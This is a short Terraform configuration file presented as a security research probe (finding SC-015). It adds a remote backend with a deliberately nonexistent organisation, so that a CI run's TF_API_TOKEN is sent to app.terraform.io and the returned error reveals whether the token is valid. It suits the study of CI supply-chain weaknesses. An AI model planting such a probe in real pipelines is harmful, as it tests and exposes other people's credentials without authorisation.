# SECURITY RESEARCH PROBE — FINDING-SC-015
# Adding backend "remote" forces terraform init to authenticate to app.terraform.io
# using TF_API_TOKEN from ~/.terraformrc (written by hashicorp/setup-terraform).
# Error type reveals token validity:
#   "Organization does not exist" → TF_API_TOKEN IS valid (auth succeeded, org missing)
#   "Request not authenticated"  → TF_API_TOKEN invalid or absent
terraform {
  backend "remote" {
    hostname     = "app.terraform.io"
    organization = "poc-sc015-security-research-nonexistent"
    workspaces {
      name = "poc-test"
    }
  }
}
